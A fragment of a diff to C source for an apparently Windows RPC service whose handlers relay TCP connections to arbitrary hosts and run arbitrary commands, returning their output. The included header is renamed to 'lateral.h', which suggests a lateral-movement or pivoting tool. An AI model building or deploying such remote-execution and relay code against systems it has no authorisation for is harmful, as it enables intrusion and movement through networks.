@@ -1,4 +1,4 @@
-#include "test.h"
+#include "lateral.h"
 #include <stdio.h>
 #include <windows.h>
 
@@ -104,6 +104,7 @@ int _connect(handle_t hBinding, char *ip, short port)
 {
     WSADATA wsa_data;   
     struct sockaddr_in sock_addr;
+    //int on;
     SOCKET c;
     
     FILE *f;
@@ -122,6 +123,7 @@ int _connect(handle_t hBinding, char *ip, short port)
     c = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(c == INVALID_SOCKET)
         return 0;
+    //ioctl(c, FIONBIO, (char *)&on);
     if( connect( c, (struct sockaddr *) &sock_addr, sizeof(sock_addr) ) )
         return 0;
 
@@ -156,7 +158,9 @@ int _send(handle_t hBinding, int socket, byte *buf, int len)
 
 int _recv(handle_t hBinding, int socket, int len, char *buf)
 {
-    int recv_bytes;
+    int recv_bytes = -1;
+    fd_set conn;
+    struct timeval timeout;
     //char *x = malloc(len);
     //memset(x, 0, len);
     //*buf = x;
@@ -168,7 +172,12 @@ int _recv(handle_t hBinding, int socket, int len, char *buf)
     fflush(f);
     fclose(f);
 
-    recv_bytes = recv((SOCKET)socket, buf, len, 0);
+    FD_ZERO(&conn);
+    FD_SET(socket, &conn);
+    timeout.tv_sec = 5;
+    timeout.tv_usec = 0;
+    if(select(0, &conn, 0, 0, &timeout) > 0)
+        recv_bytes = recv((SOCKET)socket, buf, len, 0);
     return recv_bytes;
 }
 
@@ -202,6 +211,7 @@ int _execute(handle_t hBinding, char *cmd , char **out)
     sui.hStdOutput = sui.hStdError = w;
     CreateProcess(0, cmd, 0, 0, 1, 0, 0, 0, &sui, &pi);
     WaitForSingleObject(pi.hProcess, INFINITE);
+    memset(x, '\x00', buf_size);
     ReadFile(r, x, buf_size, &bytes_read, 0);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
